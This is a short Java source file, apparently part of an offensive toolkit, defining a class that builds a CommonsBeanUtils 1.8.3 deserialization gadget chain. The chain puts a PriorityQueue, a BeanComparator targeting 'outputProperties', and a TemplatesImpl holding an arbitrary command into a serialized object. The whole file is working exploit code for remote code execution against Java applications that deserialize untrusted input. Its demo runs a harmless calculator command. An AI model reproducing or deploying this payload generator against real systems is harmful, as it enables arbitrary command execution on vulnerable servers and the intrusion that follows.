package core.payload;


import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import core.util.Util;
import org.apache.commons.beanutils.BeanComparator;

import java.util.PriorityQueue;

/**
 * Based on CommonsBeanUtils
 * Dependency: CommonsBeanUtils = 1.8.3
 */
public class NoCC implements ObjectPayload{
    @Override
    public Object getObjectPayload(String command) {
        TemplatesImpl templates = Util.createTemplates(command);
        BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
        PriorityQueue<Object> priorityQueue = new PriorityQueue<>(2, comparator);
        // Add String element : ClassCastException[java.lang.Integer cannot be cast to java.lang.String]
        priorityQueue.add("1");
        priorityQueue.add("2");
        Util.setFieldValue(comparator, "property", "outputProperties");
        Util.setFieldValue(priorityQueue, "queue", new Object[]{templates, templates});

        return priorityQueue;
    }

    public static void main(String[] args) {
        byte[] bytes = Util.serialize(new NoCC().getObjectPayload("open -a Calculator"));
    }
}
